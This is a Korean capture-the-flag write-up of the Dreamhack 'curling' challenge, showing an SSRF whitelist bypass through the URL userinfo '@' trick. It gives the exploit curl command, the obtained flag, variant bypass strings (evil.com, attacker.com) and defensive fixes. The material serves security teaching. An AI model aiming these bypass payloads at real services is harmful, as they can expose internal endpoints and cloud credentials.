---
layout: post
title:  "Dreamhack 워게임 curling 풀이 — URL의 @ 한 글자로 화이트리스트 SSRF 뚫기"
date:   2026-05-16 09:30:00 +0900
categories: security web wargame dreamhack writeup ssrf url-parsing
---

## 들어가며

Dreamhack 웹해킹 워게임 **curling** (난이도 Silver 1) 풀이입니다. "simple api server" 라는 짧은 설명 뒤에, 사이버보안 입문 학생이 꼭 한 번은 만나봐야 하는 **URL 화이트리스트의 잘못된 검증 + curl 의 userinfo 파싱 차이** 가 깔려 있습니다.

핵심 한 줄:

```bash
curl -X POST "$SERVER/api/v1/test/curl" \
  --data-urlencode 'url=http://dreamhack.io@127.0.0.1:8000/api/v1/test/internal?x='
# → {"msg":"{\"msg\":\"DH{S5Rf_1s_funNy:...}\",\"result\":true}\n","result":true}
```

`http://dreamhack.io@127.0.0.1:8000/...` 라는 URL 은:

- Python 의 `str.startswith('http://dreamhack.io')` 로는 **"dreamhack.io 로 시작하는 합법 URL"** 처럼 보이고
- 실제 curl 이 처리할 때는 **`dreamhack.io` 가 userinfo, `127.0.0.1:8000` 이 host** 로 해석되어 SSRF 가 성립

이 두 가지 해석의 어긋남이 정답입니다.

> Note: 사이버보안 입문 학습용 PoC. 실제 운영 서비스에 같은 패턴으로 시도하는 것은 금지.

## 1. 소스 정독

```python
ALLOWED_HOSTS = ['dreamhack.io', 'tools.dreamhack.io']

@app.route("/api/v1/test/curl", methods=["POST"])
def admin():
    url = request.form["url"].strip()
    for host in ALLOWED_HOSTS:
        if url.startswith('http://' + host):
            break
        return {'result': False, 'msg': 'Not Allowed host'}   # ★ 1회 반복 후 즉시 return

    if url.endswith('/test/internal'):
        return {'result': False, 'msg': 'Not Allowed endpoint'}

    try:
        response = run(["curl", f"{url}"], capture_output=True, text=True, timeout=1)
        return {'result': True, 'msg': response.stdout}
    except TimeoutExpired:
        return {'result': False, 'msg': 'Timeout'}


@app.route('/api/v1/test/internal', methods=["GET"])
def test():
    if request.remote_addr != '127.0.0.1':
        return {'result': False, 'msg': 'Only local access is allowed'}
    return {'result': True, 'msg': FLAG}
```

### 1-1. 핵심 단서 5개

1. **`/api/v1/test/internal` 은 `remote_addr == '127.0.0.1'` 일 때만 flag 반환**. 외부에서 직접 두드리면 거부. → 내부 호출 필요.
2. **`/api/v1/test/curl` 은 임의 URL 에 `curl` 을 쏘는 SSRF 의 표면**. 단, 두 개의 가드:
   - URL 이 `http://dreamhack.io` 또는 `http://tools.dreamhack.io` 로 시작
   - URL 이 `/test/internal` 로 끝나지 않음
3. **`for-break` 패턴의 함정**: `for` 안에서 `if break / else return` 형태인데 `return` 이 if 블록 밖에 있다. 즉 첫 iteration 에서 startswith 가 false 면 그 자리에서 return. **두 번째 host 는 절대 검사 안 됨**. `tools.dreamhack.io` 는 dead-code; 실제 검사되는 host 는 **`dreamhack.io` 단 하나**.
4. **`startswith('http://dreamhack.io')`** 는 prefix 만 검사. `http://dreamhack.io.evil.com` 도 통과, `http://dreamhack.io@anything` 도 통과.
5. **`url.endswith('/test/internal')`** 도 suffix 만 검사. 뒤에 query string(`?`) 이나 fragment(`#`) 하나만 붙이면 통과.

### 1-2. 정공 (URL userinfo 트릭)

RFC 3986 의 URL 일반 형식:

```
scheme://userinfo@host:port/path?query#fragment
```

`http://dreamhack.io@127.0.0.1:8000/...` 은:

- userinfo = `dreamhack.io`
- host = `127.0.0.1`
- port = `8000`

curl 은 RFC 3986 을 따르므로 **실제 connect 는 `127.0.0.1:8000`** 으로 간다. 그러나 우리 코드의 `startswith('http://dreamhack.io')` 는 단순 prefix 비교라 통과. **같은 URL 을 두 parser 가 다르게 본다** — 이게 vulnerability.

## 2. 익스플로잇

URL 을 구성할 때 두 가지를 동시에 만족시켜야 한다.

1. `startswith('http://dreamhack.io')` ✓ → 맨 앞이 `http://dreamhack.io`
2. `endswith('/test/internal')` ✗ → 끝에 `?`, `#`, 혹은 더 긴 path

가장 깔끔한 페이로드:

```
http://dreamhack.io@127.0.0.1:8000/api/v1/test/internal?x=
```

- 접두: `http://dreamhack.io` ✓
- 접미: `?x=` (≠ `/test/internal`) ✓
- curl 가 실제 보내는 GET: `GET /api/v1/test/internal?x= HTTP/1.1`, Host: `127.0.0.1:8000`
- Flask 라우팅: 쿼리스트링 무시하고 `/api/v1/test/internal` 핸들러 매칭
- `remote_addr` = `127.0.0.1` (서버가 자기 자신을 호출) → flag 반환

```bash
SERVER=http://<host>:<port>
curl -X POST "$SERVER/api/v1/test/curl" \
  --data-urlencode 'url=http://dreamhack.io@127.0.0.1:8000/api/v1/test/internal?x='
```

응답:

```json
{"msg":"{\"msg\":\"DH{S5Rf_1s_funNy:Vk2GAk+H/5RT2AnfgH6IUg==}\",\"result\":true}\n","result":true}
```

내부 응답(`/test/internal` 의 JSON) 이 `msg` 에 그대로 박혀 돌아왔다. flag 획득. ✓

### 2-1. 다른 가능한 변형

같은 클래스의 우회를 정리해두면 익숙해진다.

- `http://dreamhack.io@127.0.0.1:8000/api/v1/test/internal#` — fragment 한 글자만. curl 은 `#` 이후를 떼고 요청 → 같은 효과.
- `http://dreamhack.io@127.0.0.1:8000/api/v1/test/internal/.` — `.` 한 글자 추가. Flask 의 strict-slash 또는 normalize 가 도와줘서 같은 라우트로 매칭되는 경우가 있음 (이번 문제는 query 트릭이 더 안전).
- **DNS 트릭** : `http://dreamhack.io.attacker.com` — startswith 통과, DNS 는 attacker 의 도메인으로 가서 attacker 가 컨트롤하는 응답을 받음. 이 문제는 SSRF 목표가 내부 endpoint 라서 DNS 트릭은 부적합.

## 3. 취약점 해설 — Two-Parser Mismatch

이 문제의 본질을 두 줄로 요약하면:

> **"같은 URL 문자열을 두 개의 컴포넌트(검증기, 실행기)가 서로 다른 룰로 파싱" 하면, 그 어긋남이 SSRF/Auth bypass/cache poisoning 등으로 이어진다.**

### 3-1. 같은 클래스의 실무 사례

이 패턴은 사이버보안 입문서를 넘어 실무 사고로 자주 등장한다.

- **GitHub OAuth open redirect (2017)** — redirect_uri 검증이 단순 prefix 였고, `https://github.com.attacker.com` 으로 통과되어 토큰 탈취.
- **AWS Cognito hosted UI** — return URL 검증이 부족해 같은 패턴으로 토큰 leak.
- **Slack webhook URL filter** — 화이트리스트 검증과 실제 fetch URL parser 가 달라 SSRF.
- **CRLF 인젝션 + URL 검증** 도 같은 클래스. Python `urllib` 과 nginx 가 같은 입력을 다르게 본다.

### 3-2. 위험성

- 내부 admin 페이지 / 메타데이터 endpoint(`169.254.169.254`) 노출 → 클라우드 사고로 직결.
- 클러스터 내부의 Redis/Memcached/Elasticsearch 같은 인증 없는 내부 서비스 노출.
- SSRF + cloud IMDSv1 = IAM 자격증명 탈취 (Capital One 2019 가 정확히 이 패턴).

### 3-3. 올바른 방어

1. **URL 검증을 문자열 비교가 아니라 파서로**.

   ```python
   from urllib.parse import urlparse
   ALLOWED_HOSTS = {'dreamhack.io', 'tools.dreamhack.io'}

   p = urlparse(url)
   if p.scheme not in ('http', 'https'): reject()
   if p.hostname not in ALLOWED_HOSTS: reject()
   if p.username or p.password: reject()  # userinfo 자체를 거부
   if p.port and p.port not in (80, 443): reject()
   ```

   `hostname` 은 **userinfo 가 분리된** 실제 host 만 본다. `startswith` 보다 훨씬 안전.

2. **검증한 URL 과 실제 요청 URL 의 host 가 같은지 한 번 더 확인.** 가능하면 검증 후 resolve 된 IP 로 직접 connect.

3. **내부 endpoint 자체를 다른 신뢰 채널 로 보호**. 단순히 `remote_addr == 127.0.0.1` 만 보지 말고, 별도의 토큰/세션 요구.

4. **SSRF 가드 표준화**: outbound HTTP 라이브러리에 strict allowlist, redirect 차단, 사설망 IP 차단을 함께.

5. **shell 호출 자체를 피하라**. `run(["curl", url])` 보다 Python `requests.get(url)` 이 디버깅도 쉽고, curl 의 특수한 URL 파싱 동작에 의존하지 않는다. 만약 shell 호출이 필요하면 인자 escape 와 별개로 url scheme 화이트리스트 (`http`/`https` only) 가 필수.

## 4. 정리 — 입문자가 가져갈 교훈

- **URL prefix/suffix 비교로 검증한다 = 거의 항상 우회 가능**. 항상 정식 URL 파서 사용.
- `startswith('http://allowed.com')` 류는 다음 모두에 약하다.
  - `http://allowed.com.evil.com/`
  - `http://allowed.com@evil.com/`
  - `http://allowed.com\@evil.com/` (브라우저/parser 마다 다른 해석)
  - `http://allowed.com:80@evil.com/`
- **`endswith('/path')`** 도 마찬가지. `?`, `#`, `/.`, `;`, `%00` 등 한 글자만 추가하면 매번 우회.
- **두 컴포넌트(검증기 ↔ 실행기) 사이의 파싱 차이** 는 SSRF/Open Redirect/CRLF/HTTP smuggling 등 거의 모든 웹 보안 클래스의 공통 뿌리. 한 번 익숙해지면 평생 쓴다.
- 코드를 짤 때 **for-else / for-break / 첫 iteration 만 검사** 같은 미묘한 로직 실수도 보안적 영향을 만든다. 한 줄씩 직접 시뮬레이션해보는 습관.

같은 카테고리의 다음 단계로 **crawling (이 시리즈의 SSRF 입문)**, **SSRF Advanced**, **URL parsing differential (Orange Tsai 의 famous talk)** 같은 자료를 보면 좋다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. `for-break` 의 함정을 한 번 더 읽어야 했다

처음에 ALLOWED_HOSTS 가 2개니까 두 호스트 모두 통과시킬 수 있다고 생각했다. 코드를 다시 보니 `return` 이 if 블록 밖에 있어서 첫 iteration 에서 무조건 결정난다. `tools.dreamhack.io` 는 **dead code**. 결국 검사되는 화이트리스트는 1개.

**회고**: for-loop 안에 break 와 return 이 섞여 있으면 거의 항상 로직 오류 후보. 코드를 한 줄씩 트레이스하자. "이게 정말 두 host 모두 검사하는가?" 가 핵심 질문.

### 실패 2. `endswith('/test/internal')` 우회를 처음에 path 변형으로 시도

`/test/internal/` 같은 trailing slash 시도 → curl 이 `/test/internal/` 로 요청 → Flask 가 strict-slash redirect → 실제로 매칭. 하지만 startswith 검사가 정상 작동하는지 확인하는 데 시간을 좀 썼다. 더 깔끔하게 `?x=` 한 문자가 정답.

**회고**: `endswith` 우회는 **path 자체** 보다 **query/fragment** 추가가 가장 안전하고 가볍다. 라우팅은 query 무시하므로 부작용 없음.

### 실패 3. curl 의 redirect 동작을 잠깐 의심

처음에 "혹시 dreamhack.io 가 응답 30x 를 주고 그걸 따라가나?" 가 가능성이 있었지만, 코드의 `run(["curl", url])` 에는 `-L` 이 없다. redirect 안 따라감. 그래서 redirect 전략은 불가능.

**회고**: `run(["curl", url])` 같은 shell 호출은 사용된 옵션이 무엇인지 정확히 확인. `-L` 없으면 30x 응답은 그냥 받아오기만 함. SSRF 우회 전략을 정할 때 중요한 정보.

### 실패 4. userinfo 트릭이 곧장 떠오르지 않음

URL `@` 트릭은 SSRF 클래스의 1티어 지식이지만, 한 줄짜리 startswith 검사 보고 처음에는 "DNS 트릭 (`dreamhack.io.attacker.com`) 으로 외부 redirect 받아야 하나?" 를 먼저 생각. 곧 내부 endpoint 가 목표이므로 외부 우회 필요 없고, **`@` 한 글자가 정답** 임을 인지.

**회고**: SSRF 의 목표가 "내부 endpoint" 인지 "외부 leak" 인지 먼저 정의하자. 목표가 내부면 `@` 트릭 / IP literal / metadata IP 등이 1차 후보. 외부면 redirect / DNS rebinding / open redirector 가 1차 후보.
